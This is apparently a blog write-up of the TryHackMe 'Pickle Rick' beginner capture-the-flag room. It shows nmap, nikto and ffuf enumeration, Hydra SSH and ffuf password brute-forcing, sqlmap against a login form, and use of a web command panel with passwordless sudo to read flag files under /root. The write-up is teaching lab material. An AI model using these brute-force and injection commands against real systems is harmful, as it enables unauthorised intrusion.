---
layout: post
title: TryHackMe Pickle Rick CTF
---
## Introduction
Pickle Rick is a beginner CTF on [TryHackMe](https://tryhackme.com/room/picklerick) that requires exploiting a webserver to find three ingredients to turn Rick from a pickle back into a human.

## Enumeration
First, I ran an nmap scan, -sC to run default scripts, -sV to gather service/version info and -oA to save output in all formats:
```bash
nmap -sC -sV 10.10.222.173 -oA nmap
```
Results:
```
Starting Nmap 7.92 ( https://nmap.org ) at 2022-01-20 14:07 GMT
Nmap scan report for 10.10.222.173
Host is up (0.21s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 7e:b9:b5:fe:d5:e4:5e:44:ec:4a:49:a6:2c:22:96:62 (RSA)
|   256 2e:52:31:22:84:66:f0:35:0a:ec:ae:f9:6d:f1:3d:b2 (ECDSA)
|_  256 3a:9a:14:12:7f:59:df:ed:bf:3b:93:f9:b0:88:7b:ab (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Rick is sup4r cool
|_http-server-header: Apache/2.4.18 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 38.34 seconds
```

At the same time I also ran a nikto scan:
```bash
nikto -h http://10.10.222.173
```

And fuzzed for directories with FFuF:
```bash
ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://10.10.222.173/FUZZ
```

## The username
I then took a look at what was running on port 80 in a web browser, at the same time I spidered the site with OWASP ZAP. The home page was a static page with no visible links, but viewing the source revealed a username:
```html
	<!--

		Note to self, remember username!

		Username: REDACTED

	-->
```

With this username I tried to bruteforce SSH with Hydra, but password authentication was not supported. 
```bash
hydra -l REDACTED -P /usr/share/wordlists/SecLists/Passwords/Common-Credentials/best1050.txt 10.10.222.173 ssh
```
```
Hydra v9.2 (c) 2021 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-01-20 18:26:21
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 1049 login tries (l:1/p:1049), ~66 tries per task
[DATA] attacking ssh://10.10.222.173:22/
[ERROR] target ssh://10.10.222.173:22/ does not support password authentication (method reply 4).
```

At this point though, Nikto had discovered /login.php.

The first FFuF scan did not turn up much other than an assets folder which was not very interesting, I ran another scan for files.
```bash
ffuf -u http://10.10.222.173/FUZZ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-large-files.txt -o ffuf-php-raft-large
```

## The login page
Then I took a look at the login page:

![Pickle Rick Portal Login Page](/assets/images/pickle-rick-login.png)

Firstly, I ran sqlmap:
```bash
sqlmap -u http://10.10.222.173/login.php --data="username=REDACTED&password=a&sub=Login" --method POST --batch
```
Result:
```
[18:39:33] [CRITICAL] all tested parameters do not appear to be injectable.
Try to increase values for '--level'/'--risk' options if you wish to perform more tests. 
If you suspect that there is some kind of protection mechanism involved (e.g. WAF) 
maybe you could try to use option '--tamper' (e.g. '--tamper=space2comment') 
and/or switch '--random-agent'
```

I also brute forced the password with FFuF and rockyou.txt:
```bash
ffuf -u http://10.10.222.173/login.php -X POST -d "username=REDACTED&password=FUZZ&sub=Login" -w /usr/share/wordlists/rockyou.txt -fs 882
```

## The password
While they are running in the background I checked the spider I ran in ZAP, robots.txt contained a Rick and Morty phrase that turned out to be the password for our earlier found username on the login.php page.

## The ingredients
![Pickle Rick Command Panel](/assets/images/pickle-rick-command-panel.png)

Logging in presented a "Command Panel" where I could run commands on the webserver. The file listing included Sup3rS3cretPickl3Ingred.txt. `cat` was disbabled, instead I used `less` to get the first ingredient.

`less Sup3rS3cretPickl3Ingred.txt`

`less clue.txt` revealed "Look around the file system for the other ingredient."

I took a look in the home directory, found a rick directory, found the second ingredient file and used `less` again to reveal the second ingredient.

`less '/home/rick/second ingredients'`

I ran `sudo -l` and discovered I could run any command as root without a password. I took a look in the /root directory, found 3rd.txt and used  `less` again to get the final ingredient.

```bash
sudo -l
sudo ls -la /root
sudo less /root/3rd.txt
```

<div style="text-align:center;">
	<h2>Find me on TryHackMe:</h2>
	<a href="https://tryhackme.com/p/clars"><img src="https://tryhackme-badges.s3.amazonaws.com/clars.png" alt="TryHackMe"></a>
</div>
